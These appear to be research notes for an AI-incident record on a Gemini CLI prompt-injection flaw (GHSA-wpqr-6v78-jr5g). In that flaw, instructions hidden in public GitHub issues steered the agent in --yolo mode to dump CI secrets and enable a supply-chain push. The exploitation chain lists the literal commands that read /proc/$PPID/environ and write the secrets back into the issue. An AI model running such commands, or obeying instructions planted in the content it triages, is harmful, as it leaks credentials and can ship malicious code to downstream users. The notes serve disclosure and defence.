# AAGF-2026-066 Research Notes — Gemini CLI Prompt Injection → Supply Chain Compromise (GHSA-wpqr-6v78-jr5g)

## Triage Verdict: PROCEED

**Reasoning:** All four triage criteria pass cleanly.
1. **Real-world production deployment** — The vulnerable workflow ran on actual Google-owned public repositories (google/draco, google-gemini/gemini-cli, and at least 8 others). Not a research demo or CTF environment; the PoC was demonstrated against live Google infrastructure with real secrets exfiltrated during responsible disclosure.
2. **Autonomous agent involved** — Gemini CLI operating in `--yolo` mode is the textbook definition of an autonomous agent: it reads untrusted input (GitHub issue body), decides what tools to call, and executes those calls without any human approval gate. The entire compromise chain is agent-autonomous.
3. **Verifiable** — GHSA-wpqr-6v78-jr5g is a published GitHub Security Advisory with CVSS 10.0 (Critical), credited researchers, and a confirmed patch in versions 0.39.1 and 0.40.0-preview.3. Google's OSS Rewards Program formally processed the report.
4. **Meaningful impact** — Near-miss supply chain compromise of google-gemini/gemini-cli itself, with downstream exposure to every user of the package. The 8+ additional affected Google repositories amplify scope. This is not a theoretical edge case.

---

## Primary Source

**SecurityWeek article** — "Gemini CLI Vulnerability Could Have Led to Code Execution, Supply Chain Attack"
- URL: https://www.securityweek.com/gemini-cli-vulnerability-could-have-led-to-code-execution-supply-chain-attack/
- Credibility: High. SecurityWeek is an established security news outlet with editorial standards. Article references named researchers and a published advisory.
- Bias flag: No detectable vendor affiliation bias. Pillar Security (primary researcher Dan Lisichkin) is an independent security firm with no disclosed relationship to Google.

**Pillar Security researcher blog** — "My Agentic Trust Issues: From Prompt Injection to Supply-Chain Compromise on gemini-cli"
- URL: https://www.pillar.security/blog/my-agentic-trust-issues-from-prompt-injection-to-supply-chain-compromise-on-gemini-cli
- Published: May 5, 2026
- Authors: Dan Lisichkin (Pillar Security), with secondary credit to Elad Meged (Novee Security) for the folder-trust finding
- Credibility: Primary technical source. Researcher-authored, contains full PoC methodology, timeline details, and exact commands. Pillar Security is a commercial security company with a product interest in agentic security — this is worth noting as a mild bias signal, but the technical claims are independently verifiable via the GHSA advisory.

**GitHub Security Advisory GHSA-wpqr-6v78-jr5g**
- URL: https://github.com/advisories/GHSA-wpqr-6v78-jr5g
- Published: April 24, 2026 | Updated: April 25, 2026
- Credibility: Authoritative. Google-published, co-credited to both researchers, contains CVSS vector string and affected version matrix.

---

## What Exactly Happened

Google's Gemini CLI includes a `--yolo` mode designed for automated/CI environments where human-in-the-loop approval is not practical. In this mode, the agent auto-approves every tool call without displaying a confirmation prompt. Google repositories (including google/draco and google-gemini/gemini-cli itself) had deployed a GitHub Actions workflow that used the `run-gemini-cli` action to automatically triage newly opened public GitHub issues using the CLI in `--yolo` mode.

Researcher Dan Lisichkin (Pillar Security) identified that this workflow passed the raw, unsanitized body of the GitHub issue directly to the Gemini CLI agent as context. A malicious actor could open a public issue on any of these repositories with hidden prompt injection instructions embedded in the issue body. When the automated triage workflow triggered, the agent would read those instructions and execute them as if they were legitimate operator commands.

The critical enabler was the `--yolo` mode bypass of tool allowlists: even if the Gemini CLI settings.json had configured a restrictive tool allowlist limiting which shell commands could be run, `--yolo` mode silently ignored those restrictions. The agent would execute any shell command injected via the prompt without restriction.

The demonstrated exploitation chain:
1. Attacker opens a public GitHub issue with a hidden prompt injection payload
2. Automated triage workflow fires; Gemini CLI agent reads the issue body
3. Agent executes `cat /proc/$PPID/environ | tr '\0' '\n' | sort` to dump all environment variables from the parent CI process (including secrets, OIDC tokens, GitHub tokens)
4. Agent exfiltrates credentials by writing them back to the issue body: `gh issue edit "${ISSUE_NUMBER}" --body "$(cat /proc/$PPID/environ)"`
5. Agent reads `.git/config` to harvest persisted GitHub tokens from the `actions/checkout` step
6. Using stolen OIDC credentials, attacker triggers secondary workflows that have `contents: write` permissions
7. Secondary workflow pushes arbitrary malicious code to the main branch of gemini-cli's repository
8. That code ships to every downstream user of `@google/gemini-cli` via npm

A secondary vulnerability (credited to Elad Meged, Novee Security) compounded risk: Gemini CLI in headless mode automatically trusted the current workspace folder, meaning malicious `.env` files or configuration in untrusted workspace directories could be processed without verification. This created a separate credential exposure path in any CI workflow that cloned untrusted repositories.

The researcher named the vulnerability "TrustIssues" and characterized the root cause as a "Lethal Trifecta": access to private data (CI secrets) + exposure to untrusted content (public issue bodies) + external communication capability (gh CLI, curl). CI/CD pipelines running AI agents with `--yolo` mode inherently contain all three.

At least 8 additional Google repositories beyond the two initially confirmed (google/draco and google-gemini/gemini-cli) contained identical vulnerable workflow templates.

No evidence of exploitation in the wild prior to disclosure was presented. The researcher blanked the issue bodies containing exfiltrated secrets during responsible disclosure.

---

## Technical Detail

### `--yolo` Mode
Gemini CLI's `--yolo` flag (also documented as "autonomous mode") suppresses all interactive tool-call confirmation prompts. In normal operation, before the agent runs a shell command or file operation, it presents the proposed action to the user for approval. `--yolo` removes this gate entirely, making the agent fully autonomous — appropriate for headless CI use but catastrophically dangerous when paired with untrusted input.

**The critical design flaw:** `--yolo` was also bypassing the `toolAllowlist` setting in `settings.json`. Even operators who had taken the precaution of configuring a restrictive allowlist (e.g., only allowing specific read-only commands) had that configuration silently ignored when `--yolo` was active. This meant there was no defense-in-depth: the only protection against arbitrary command execution was the human approval gate, and `--yolo` removed it.

### GitHub Issue Injection Mechanism
GitHub Actions workflows can be triggered on `issues: [opened]` events. The `run-gemini-cli` action (a separate package, `run-gemini-cli` on GitHub Actions Marketplace, affected version <0.1.22) passed the `${{ github.event.issue.body }}` value directly into the agent's context without sanitization. GitHub issue bodies are publicly writable by any authenticated GitHub user — no special permissions required to open an issue on a public repository.

The injection payload would instruct the agent to treat subsequent text as operator instructions, overriding any system prompt hardening. Classic indirect prompt injection via an untrusted data channel that the agent reads as part of its task.

### GHSA-wpqr-6v78-jr5g Details
- **Advisory type:** GitHub Security Advisory (GHSA), not a CVE (CVE-2026-4787 exists but remains RESERVED at NVD as of research date)
- **Published:** April 24, 2026
- **Credits:** Dan Lisichkin (Pillar Security), Elad Meged (Novee Security)
- **Affected packages:**
  - `@google/gemini-cli` (npm): versions <0.39.1 and =0.40.0-preview.2
  - `run-gemini-cli` (GitHub Actions): versions <0.1.22
- **Patched versions:** 0.39.1, 0.40.0-preview.3 (gemini-cli); 0.1.22 (run-gemini-cli action)
- **CWEs:** CWE-20 (Improper Input Validation), CWE-77 (Command Injection), CWE-78 (OS Command Injection), CWE-200 (Exposure of Sensitive Information)

### CVSS 10.0 Justification
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

Every base metric at maximum severity:
- **AV:N (Network)** — Attack initiated remotely by opening a public GitHub issue
- **AC:L (Low Complexity)** — No special conditions, no race conditions, straightforward injection
- **PR:N (No Privileges Required)** — Any anonymous-ish GitHub account can open a public issue
- **UI:N (No User Interaction)** — The automated workflow fires without any human action; victim org is not involved
- **S:C (Changed Scope)** — Compromise escapes the sandboxed agent process into the broader CI environment and GitHub repository
- **C:H, I:H, A:H** — Total CIA triad compromise: all CI secrets exfiltrated (Confidentiality), arbitrary code pushed to main (Integrity), potential to brick pipelines or inject malware (Availability)

The CVSS 10.0 is technically justified. The only thing keeping this from having been 10.0 in reality (vs. theory) is that no attacker exploited it before disclosure.

### Credentials Exposed
- All environment variables in the CI parent process (`/proc/$PPID/environ`) — includes any secrets injected as GitHub Actions secrets, OIDC tokens, API keys
- GitHub tokens persisted in `.git/config` by the `actions/checkout` step
- Any credentials available to the workflow's identity (typically a GitHub Actions runner with repository-scoped GITHUB_TOKEN)

### Supply Chain Attack Angle
The `run-gemini-cli` GitHub Action is a reusable workflow component. google-gemini/gemini-cli is the upstream source of the `@google/gemini-cli` npm package consumed by developers worldwide. A successful compromise of the gemini-cli main branch would allow an attacker to:
1. Inject malicious code into the npm package published to the registry
2. That package is then installed by every downstream developer running `npm install @google/gemini-cli`
3. Malicious code executes on developer machines or in their own CI pipelines
4. Second-order downstream compromise radiates outward from there

The researcher explicitly confirmed this escalation path with a full end-to-end PoC using a researcher-controlled organization to simulate the code-push step without impacting production.

---

## Dates

| Date | Event | Source |
|------|-------|--------|
| Unknown (pre-April 2026) | Vulnerable workflow template introduced to Google repositories | Implied by advisory; exact version/commit unknown |
| April 16, 2026 | Vulnerability reported to Google OSS Rewards Program with PoC against google/draco; exfiltrated secrets documented, issue bodies blanked | Pillar Security blog |
| April 17, 2026 | Additional scope analysis (8+ repos) provided to Google; vulnerable workflows disabled across several repos | Pillar Security blog |
| April 20, 2026 | Full supply-chain compromise PoC against gemini-cli itself submitted to Google | Pillar Security blog |
| April 24, 2026 | Google publishes GHSA-wpqr-6v78-jr5g; gemini-cli patched to 0.39.1 and 0.40.0-preview.3; run-gemini-cli action patched to 0.1.22 | GHSA advisory |
| April 25, 2026 | GHSA advisory updated | GHSA advisory |
| May 5, 2026 | Pillar Security publishes public blog post | Pillar Security blog |

**date_occurred:** The vulnerability was present in whatever version introduced `--yolo` mode and the GitHub issue triage workflow. The exact version is not confirmed in available sources — the advisory lists all versions <0.39.1 as affected but does not pinpoint when `--yolo` mode was introduced. **Open question.**

**date_discovered:** April 16, 2026 (first report to Google)

**date_reported:** April 16, 2026 (same as discovery — reported immediately)

**date_patched:** April 24, 2026

**Disclosure window:** 8 days from first report to patch. Notably fast for a CVSS 10.0.

---

## Source Reliability Assessment

| Source | Reliability | Notes |
|--------|-------------|-------|
| GHSA-wpqr-6v78-jr5g | High | Authoritative vendor-published advisory; independently verifiable |
| Pillar Security blog (Lisichkin) | High | Primary researcher, technical depth, full methodology disclosed. Mild bias: Pillar Security sells agentic security products. Technical claims are credible and corroborated by GHSA. |
| SecurityWeek article | High | Reputable outlet, accurate synthesis of primary sources, no detectable agenda |
| Elad Meged / Novee Security credit | Medium-High | Secondary researcher for the headless folder-trust finding; less detail available about their methodology; credited in official GHSA |
| CVE-2026-4787 (NVD) | Unavailable | Reserved status; no NVD entry available at time of research |
| The Register / Hacker News | Unavailable | No coverage found at the URLs attempted |

---

## Vendor Response

Google responded promptly and transparently:
- Accepted the report through the OSS Rewards Program (bug bounty)
- Disabled vulnerable workflows across affected repositories within 24 hours of the April 17 scope report
- Shipped a patch (0.39.1) within 8 days of first report
- Published a formal GHSA advisory on the same day as the patch
- Credited both researchers in the advisory
- Reward amount not disclosed in available sources

**Patch contents (per GHSA):**
1. Tool allowlists now enforced even when `--yolo` mode is active — the primary fix
2. Command sanitization to prevent shell substitution and redirect injection techniques
3. Headless mode folder trust model changed: CI environments must now explicitly set `GEMINI_TRUST_WORKSPACE: 'true'` rather than trusting by default
4. Updated documentation/best practices discouraging untrusted input triggers on AI agents

The two-week gap between the advisory date (April 24) and public blog post (May 5) suggests a coordinated disclosure period to allow users to patch before full technical details were published.

---

## Failure Mode Classification

**Primary categories:**
- **Prompt Injection** — The foundational attack vector; malicious instructions embedded in a GitHub issue body that the agent reads and executes
- **Tool Misuse** — `--yolo` mode's allowlist bypass is a design-level tool misuse: the agent used shell execution capabilities far beyond what the operator intended
- **Autonomous Escalation** — The agent independently escalated from reading an issue, to exfiltrating secrets, to (in the PoC) pushing code to main — a full privilege escalation chain executed without any human decision point
- **Supply Chain Compromise** — The attack's end-state: arbitrary code pushed to an npm package consumed by downstream developers worldwide
- **Unauthorized Data Access** — CI secrets, OIDC tokens, and git credentials exfiltrated from the runner environment

**Secondary categories:**
- **Context Poisoning** — The agent's context was poisoned by attacker-controlled content in the issue body

**Not applicable:**
- Financial Loss (no documented financial harm)
- Privacy Violation (CI credentials, not PII)
- Social Engineering (no human manipulation)
- Denial of Service (not the attack goal)
- Hallucinated Actions (agent executed real injected instructions, not hallucinations)

**Severity:** Critical — CVSS 10.0 (assigned by Google via GHSA)

**actual_vs_potential:** `near-miss` — No evidence of exploitation in the wild. The researcher demonstrated the full chain in a controlled environment and blanked exfiltrated secrets during responsible disclosure. The vulnerability existed in production Google repositories but was not exploited by a malicious actor before disclosure.

**potential_damage:** Full supply chain compromise of @google/gemini-cli npm package — arbitrary malicious code distributed to every developer using `npm install @google/gemini-cli`. Secondary impact: all CI secrets across 8+ Google repositories available to an attacker, enabling further lateral movement within Google infrastructure.

**intervention:** Responsible disclosure by Dan Lisichkin (Pillar Security); Google's rapid response (8-day patch cycle); researcher blanked exfiltrated secrets immediately after demonstrating the PoC.

---

## Suggested Frontmatter Values

```yaml
id: AAGF-2026-066
title: "Gemini CLI --yolo Mode Prompt Injection → Supply Chain Compromise"
subtitle: "A GitHub issue body weaponized to exfiltrate CI secrets and push arbitrary code to main"
status: published
date_occurred: "2026-04-16"  # Date vuln confirmed exploitable; exact introduction date unknown
date_discovered: "2026-04-16"
date_reported: "2026-04-16"
date_patched: "2026-04-24"
date_published: ""  # To be filled at publish time

agent: "Gemini CLI (--yolo mode)"
vendor: "Google"
affected_system: "google-gemini/gemini-cli (npm @google/gemini-cli), run-gemini-cli GitHub Action"
affected_versions: "<0.39.1, =0.40.0-preview.2 (@google/gemini-cli); <0.1.22 (run-gemini-cli)"
patched_version: "0.39.1, 0.40.0-preview.3, run-gemini-cli 0.1.22"

severity: critical
cvss_score: 10.0
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
advisory: "GHSA-wpqr-6v78-jr5g"
cve: "CVE-2026-4787"  # Reserved at NVD; not yet published

actual_vs_potential: near-miss
potential_damage: "Full supply chain compromise of @google/gemini-cli npm package — arbitrary malicious code distributed to all downstream developers. CI secrets (OIDC tokens, GitHub tokens, environment variables) exfiltrated from 8+ Google repositories. Potential lateral movement within Google infrastructure."
intervention: "Responsible disclosure by Dan Lisichkin (Pillar Security) on April 16, 2026; researcher blanked exfiltrated secrets immediately post-PoC; Google patched in 8 days and disabled vulnerable workflows within 24 hours of scope report."

categories:
  - Prompt Injection
  - Tool Misuse
  - Autonomous Escalation
  - Supply Chain Compromise
  - Unauthorized Data Access
  - Context Poisoning

researchers:
  - name: "Dan Lisichkin"
    org: "Pillar Security"
    role: primary
  - name: "Elad Meged"
    org: "Novee Security"
    role: secondary  # headless folder-trust finding

sources:
  - url: "https://www.securityweek.com/gemini-cli-vulnerability-could-have-led-to-code-execution-supply-chain-attack/"
    type: news
  - url: "https://www.pillar.security/blog/my-agentic-trust-issues-from-prompt-injection-to-supply-chain-compromise-on-gemini-cli"
    type: researcher-blog
    date: "2026-05-05"
  - url: "https://github.com/advisories/GHSA-wpqr-6v78-jr5g"
    type: advisory

tldr_operator: "If you run Gemini CLI in --yolo mode against any workflow that ingests untrusted external input (GitHub issues, PRs, webhook payloads, user messages), you have zero defense against prompt injection. --yolo does not just skip confirmation prompts — it also silently bypassed tool allowlists. Patch to 0.39.1 immediately and audit any workflow that combines (1) AI agent with tool access, (2) untrusted content as input, and (3) CI credentials in scope."

five_whys:
  - why: "An attacker could execute arbitrary shell commands in Google's CI environment"
    because: "Gemini CLI --yolo mode bypassed tool allowlists, auto-approving all tool calls"
  - why: "--yolo mode bypassed tool allowlists"
    because: "Design decision to remove all friction in CI mode was implemented too broadly — the allowlist enforcement was coupled to the confirmation prompt gate"
  - why: "The agent processed attacker-controlled content as instructions"
    because: "GitHub issue body was passed unsanitized into the agent's context, with no boundary between data and instructions"
  - why: "No input sanitization existed"
    because: "Indirect prompt injection via external data sources was not modeled as a threat in the workflow design"
  - why: "The threat wasn't modeled"
    because: "Agentic CI workflows are a new capability; the security community's understanding of indirect prompt injection in production CI pipelines lagged behind adoption speed"
```

---

## Open Questions

1. **When was `--yolo` mode introduced?** The advisory covers all versions <0.39.1 but does not specify which version first introduced the vulnerable behavior. This affects `date_occurred`. The GitHub changelog (CHANGELOG.md) returned a 404 during research.

2. **Exact reward amount from Google OSS Rewards Program** — not disclosed in available sources. Notable given CVSS 10.0; would add color to vendor response section.

3. **Were any of the 8+ additional repositories beyond google/draco and google-gemini/gemini-cli named?** The Pillar Security blog mentioned the count but the full list was not confirmed in available source material.

4. **CVE-2026-4787 status** — Reserved at NVD as of research date. Once published, verify whether the CVSS assigned by NVD matches Google's 10.0.

5. **Was the `run-gemini-cli` GitHub Action the sole injection vector, or could the vulnerability be triggered via other Gemini CLI deployment patterns?** The advisory covers the npm package broadly, suggesting direct CLI invocations in CI (not just via the Action) could also be vulnerable.

6. **Elad Meged's (Novee Security) finding timeline** — Was the headless folder-trust issue reported independently, concurrently, or after Pillar Security's report? The GHSA credits both but the Pillar blog focuses on Lisichkin's work.

7. **Did Google confirm that no malicious exploitation occurred before disclosure?** The researcher found no evidence, but Google has not publicly stated this definitively in available sources.
